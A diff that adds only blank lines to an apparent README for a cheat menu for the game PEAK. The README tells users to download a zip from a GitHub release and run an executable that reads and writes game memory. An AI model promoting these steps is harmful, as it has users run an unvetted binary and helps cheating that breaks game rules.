@@ -73,9 +73,13 @@ Check out the Features list
 ## How to Install
 
 1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip) from repo's Releases page.
+
 2. Extract the contents to any folder (e.g., `C:\PEAK_Cheat`).
+
 3. Launch game.
+
 4. Run the cheat (`PEAK-menu_github-1.1.exe`).
+
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
@@ -86,9 +90,11 @@ Check out the Features list
 
 My hack only reads and writes game memory, it **does not modify** any game files or network traffic. However, use at your own risk.
 
+
 ### Can I customize the hotkey?
 
 Yes. The default toggle key is `[Insert]`, but you can change it in the settings tab.
+
 
 ### How to uninstall?
 
